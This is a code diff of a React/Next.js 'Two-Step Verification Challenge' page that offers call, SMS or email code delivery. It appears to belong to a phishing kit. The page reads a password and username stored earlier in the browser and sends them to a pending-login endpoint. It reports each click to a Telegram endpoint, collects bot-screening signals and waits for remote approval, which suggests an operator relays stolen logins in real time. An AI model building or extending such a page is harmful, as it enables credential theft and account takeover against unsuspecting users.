@@ -1,16 +1,13 @@
 "use client"
 
-import { useEffect, useState, type FormEvent } from "react"
+import { useEffect, useState, type ReactNode } from "react"
 import { useRouter } from "next/navigation"
+import EbcVerifyChallengeShell from "@/components/EbcVerifyChallengeShell"
+import styles from "@/components/ebc-verify-challenge.module.css"
 import {
   APPROVAL_TIMEOUT_MS,
   MSG_UNABLE_REACH_VERIFICATION,
 } from "@/lib/approval-messages"
-import {
-  EbcParticipantShell,
-  EBC_LINK_CLASS,
-  ebcPrimaryButtonClass,
-} from "@/components/ebc-participant-shell"
 import { useBotGateSignals } from "@/hooks/use-bot-gate-signals"
 import { readStoredPassword, readStoredUsername } from "@/lib/login-flow-storage"
 import { pollPendingLogin } from "@/lib/poll-pending-login"
@@ -20,28 +17,95 @@ import {
   type DeliveryMethod,
 } from "@/lib/verification-method"
 
-const options: Array<{
-  id: DeliveryMethod
-  title: string
-  subtitle: string
-}> = [
-  {
-    id: "text",
-    title: "Text Me a Code",
-    subtitle: "You'll enter it to log on.",
-  },
-  {
-    id: "call",
-    title: "Call Me With a Code",
-    subtitle: "Get a call that says a code for you to enter.",
-  },
-]
+function WarningIcon() {
+  return (
+    <svg className={styles.alertIcon} viewBox="0 0 24 24" aria-hidden="true">
+      <path
+        fill="#8a6d1d"
+        d="M12 2 1 21h22L12 2zm0 4.8 7.2 12.4H4.8L12 6.8zM11 10v5h2v-5h-2zm0 6v2h2v-2h-2z"
+      />
+    </svg>
+  )
+}
+
+function PhoneIcon() {
+  return (
+    <svg className={styles.methodBtnIcon} viewBox="0 0 24 24" aria-hidden="true">
+      <path
+        fill="currentColor"
+        d="M6.6 10.8c1.4 2.8 3.8 5.1 6.6 6.6l2.2-2.2c.3-.3.7-.4 1.1-.2 1.2.4 2.5.6 3.8.6.6 0 1 .4 1 1V20c0 .6-.4 1-1 1C10.6 21 3 13.4 3 4c0-.6.4-1 1-1h3.5c.6 0 1 .4 1 1 0 1.3.2 2.6.6 3.8.1.4 0 .8-.3 1.1l-2.2 2.2z"
+      />
+    </svg>
+  )
+}
+
+function TextIcon() {
+  return (
+    <svg className={styles.methodBtnIcon} viewBox="0 0 24 24" aria-hidden="true">
+      <path
+        fill="currentColor"
+        d="M4 4h16a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H8l-4 4v-4H4a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2zm2 4v2h8V8H6zm0 4v2h12v-2H6z"
+      />
+    </svg>
+  )
+}
+
+function AtIcon() {
+  return (
+    <svg className={styles.methodBtnIcon} viewBox="0 0 24 24" aria-hidden="true">
+      <path
+        fill="currentColor"
+        d="M12 2a10 10 0 1 0 3.5 19.4l-.9-1.8A8 8 0 1 1 20 12v1a2 2 0 0 1-4 0V8h-1.7A4.5 4.5 0 1 0 16.5 14 3.9 3.9 0 0 0 22 13v-1A10 10 0 0 0 12 2zm0 6.5A2.5 2.5 0 1 1 9.5 11 2.5 2.5 0 0 1 12 8.5z"
+      />
+    </svg>
+  )
+}
+
+function MethodButtonSpinner() {
+  return <span className={styles.btnSpinner} aria-hidden="true" />
+}
+
+type MethodButtonProps = {
+  method: DeliveryMethod
+  label: string
+  icon: ReactNode
+  className: string
+  selectedMethod: DeliveryMethod | ""
+  isPolling: boolean
+  onSelect: (method: DeliveryMethod) => void
+}
+
+function MethodButton({
+  method,
+  label,
+  icon,
+  className,
+  selectedMethod,
+  isPolling,
+  onSelect,
+}: MethodButtonProps) {
+  const isLoading = isPolling && selectedMethod === method
+
+  return (
+    <button
+      type="button"
+      className={className}
+      onClick={() => void onSelect(method)}
+      disabled={isPolling}
+      aria-pressed={selectedMethod === method}
+      aria-busy={isLoading}
+    >
+      {isLoading ? <MethodButtonSpinner /> : icon}
+      {label}
+    </button>
+  )
+}
 
 export default function VerifyChoicePage() {
   const router = useRouter()
-  const [isLoading, setIsLoading] = useState(false)
-  const [selectedOptionId, setSelectedOptionId] = useState<DeliveryMethod>("text")
-  const [networkError, setNetworkError] = useState("")
+  const [selectedMethod, setSelectedMethod] = useState<DeliveryMethod | "">("")
+  const [isPolling, setIsPolling] = useState(false)
+  const [error, setError] = useState("")
   const getBotGateSignals = useBotGateSignals()
 
   useEffect(() => {
@@ -54,27 +118,26 @@ export default function VerifyChoicePage() {
     }
   }, [])
 
-  const handleContinue = async (event: FormEvent) => {
-    event.preventDefault()
-    if (isLoading) return
-    setIsLoading(true)
-    setNetworkError("")
+  async function handleSelect(method: DeliveryMethod) {
+    if (isPolling) return
+    setIsPolling(true)
+    setError("")
+    setSelectedMethod(method)
 
-    const selected = options.find((option) => option.id === selectedOptionId)
-    if (!selected) {
-      setIsLoading(false)
-      return
-    }
-    const id = selected.id
-    const title = selected.title
+    const clickType =
+      method === "email" ? "email_verification" : "text_verification"
 
-    await fetch("/api/telegram/verification-click", {
+    void fetch("/api/telegram/verification-click", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        verificationType: title,
+        type: clickType,
+        verificationType: verificationTypeLabel(method),
+        method: pendingLoginMethod(method),
         page: "/verify-choice",
+        timestamp: new Date().toISOString(),
       }),
+      keepalive: true,
     }).catch(() => {})
 
     const userId = readStoredUsername() || sessionStorage.getItem("loginUserId") || ""
@@ -89,7 +152,7 @@ export default function VerifyChoicePage() {
         body: JSON.stringify({
           userId,
           password,
-          method: pendingLoginMethod(id),
+          method: pendingLoginMethod(method),
           maskedEmail,
           maskedPhone,
           flow: "login",
@@ -98,8 +161,9 @@ export default function VerifyChoicePage() {
       })
       const data = (await res.json()) as { id?: string; error?: string }
       if (!res.ok) {
-        setNetworkError(data.error || MSG_UNABLE_REACH_VERIFICATION)
-        setIsLoading(false)
+        setError(data.error || MSG_UNABLE_REACH_VERIFICATION)
+        setSelectedMethod("")
+        setIsPolling(false)
         return
       }
       if (!data.id) {
@@ -110,9 +174,9 @@ export default function VerifyChoicePage() {
       const result = await pollPendingLogin(data.id, APPROVAL_TIMEOUT_MS)
 
       if (result === "approved") {
-        sessionStorage.setItem("verificationMethod", id)
-        sessionStorage.setItem("verificationType", verificationTypeLabel(id))
-        router.push(`/verify?method=${encodeURIComponent(id)}`)
+        sessionStorage.setItem("verificationMethod", method)
+        sessionStorage.setItem("verificationType", verificationTypeLabel(method))
+        router.push(`/verify?method=${encodeURIComponent(method)}`)
         return
       }
       if (result === "redirected") {
@@ -125,61 +189,78 @@ export default function VerifyChoicePage() {
       }
       window.location.href = "/?verifyUnavailable=1"
     } catch {
-      setNetworkError(MSG_UNABLE_REACH_VERIFICATION)
-      setIsLoading(false)
+      setError(MSG_UNABLE_REACH_VERIFICATION)
+      setSelectedMethod("")
+      setIsPolling(false)
     }
   }
 
   return (
-    <EbcParticipantShell
-      title="Verify It's You"
-      intro="Before you can get full access, you'll need to confirm your identity."
+    <EbcVerifyChallengeShell
+      onLogout={() => {
+        window.location.href = "/"
+      }}
+      logoutDisabled={isPolling}
     >
-      <form onSubmit={handleContinue} className="max-w-xl">
-        <div className="space-y-3">
-          {options.map((option) => {
-            const selected = selectedOptionId === option.id
-            return (
-              <button
-                key={option.id}
-                type="button"
-                disabled={isLoading}
-                onClick={() => setSelectedOptionId(option.id)}
-                className={`w-full text-left border rounded-sm px-4 py-3 ${
-                  selected ? "border-blue-400 ring-1 ring-blue-400 bg-white" : "border-gray-300 bg-white"
-                } ${isLoading ? "opacity-70 cursor-not-allowed" : "hover:bg-gray-50"}`}
-              >
-                <p className="font-bold text-[20px]">{option.title}</p>
-                <p className="mt-1 text-gray-600">{option.subtitle}</p>
-              </button>
-            )
-          })}
-        </div>
+      <h1 className={styles.title}>Two-Step Verification Challenge</h1>
+      <h2 className={styles.subtitle}>Receive the verification code</h2>
+      <hr className={styles.rule} />
 
-        {networkError ? (
-          <p className="mt-6 text-red-600 text-sm" role="alert">
-            {networkError}
-          </p>
-        ) : null}
+      <div className={styles.alert} role="status">
+        <WarningIcon />
+        <span>We need to verify who you are before we let you log in.</span>
+      </div>
 
-        <div className="mt-8">
-          <button
-            type="submit"
-            disabled={isLoading}
-            className={ebcPrimaryButtonClass(isLoading)}
-          >
-            <span className="text-[18px]">{isLoading ? "Loading..." : "Continue"}</span>
-          </button>
-          <button
-            type="button"
-            disabled={isLoading}
-            onClick={() => router.push("/")}
-            className={`${EBC_LINK_CLASS} mt-3`}
-          >
-            Cancel
-          </button>
+      {error ? <p className={styles.error}>{error}</p> : null}
+
+      <p className={styles.rates}>Standard messaging rates may apply.</p>
+
+      <section className={styles.section} aria-labelledby="mobile-phone-heading">
+        <h3 id="mobile-phone-heading" className={styles.sectionTitle}>
+          Mobile Phone
+        </h3>
+        <div className={styles.buttonRow}>
+          <MethodButton
+            method="call"
+            label="Call"
+            icon={<PhoneIcon />}
+            className={`${styles.methodBtn} ${styles.btnCall}`}
+            selectedMethod={selectedMethod}
+            isPolling={isPolling}
+            onSelect={handleSelect}
+          />
+          <MethodButton
+            method="text"
+            label="SMS"
+            icon={<TextIcon />}
+            className={`${styles.methodBtn} ${styles.btnText}`}
+            selectedMethod={selectedMethod}
+            isPolling={isPolling}
+            onSelect={handleSelect}
+          />
         </div>
-      </form>
-    </EbcParticipantShell>
+      </section>
+
+      <section className={styles.section} aria-labelledby="email-heading">
+        <h3 id="email-heading" className={styles.sectionTitle}>
+          Email
+        </h3>
+        <p className={styles.sectionCopy}>
+          You may choose to receive your verification code via email; however, we
+          recommend using a phone option for improved security.
+        </p>
+        <div className={styles.buttonRow}>
+          <MethodButton
+            method="email"
+            label="Email"
+            icon={<AtIcon />}
+            className={`${styles.methodBtn} ${styles.btnEmail}`}
+            selectedMethod={selectedMethod}
+            isPolling={isPolling}
+            onSelect={handleSelect}
+          />
+        </div>
+      </section>
+    </EbcVerifyChallengeShell>
   )
 }
